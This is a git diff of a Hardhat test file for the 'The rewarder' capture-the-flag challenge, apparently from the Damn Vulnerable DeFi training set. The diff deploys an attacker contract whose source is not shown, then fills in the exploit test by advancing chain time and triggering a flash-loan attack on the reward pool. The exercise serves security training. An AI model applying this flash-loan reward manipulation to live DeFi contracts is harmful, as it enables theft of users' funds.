@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { utils } = require('ethers');
 
 describe('[Challenge] The rewarder', function () {
 
@@ -19,6 +20,8 @@ describe('[Challenge] The rewarder', function () {
         const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
         const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);
+        const AttckerFactory = await ethers.getContractFactory("Attacker",attacker);
+
 
         this.liquidityToken = await DamnValuableTokenFactory.deploy();
         this.flashLoanPool = await FlashLoanerPoolFactory.deploy(this.liquidityToken.address);
@@ -29,7 +32,8 @@ describe('[Challenge] The rewarder', function () {
         this.rewarderPool = await TheRewarderPoolFactory.deploy(this.liquidityToken.address);
         this.rewardToken = await RewardTokenFactory.attach(await this.rewarderPool.rewardToken());
         this.accountingToken = await AccountingTokenFactory.attach(await this.rewarderPool.accToken());
-
+           
+        
         // Alice, Bob, Charlie and David deposit 100 tokens each
         for (let i = 0; i < users.length; i++) {
             const amount = ethers.utils.parseEther('100');
@@ -62,10 +66,17 @@ describe('[Challenge] The rewarder', function () {
         expect(
             await this.rewarderPool.roundNumber()
         ).to.be.eq('2');
+
+        this.attacks = await AttckerFactory.deploy(this.flashLoanPool.address,this.rewarderPool.address,this.rewardToken.address,this.liquidityToken.address);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+        await this.attacks.attack(TOKENS_IN_LENDER_POOL);
+
+        console.log(TOKENS_IN_LENDER_POOL);
+        console.log(await this.rewardToken.balanceOf(attacker.address));
     });
 
     after(async function () {
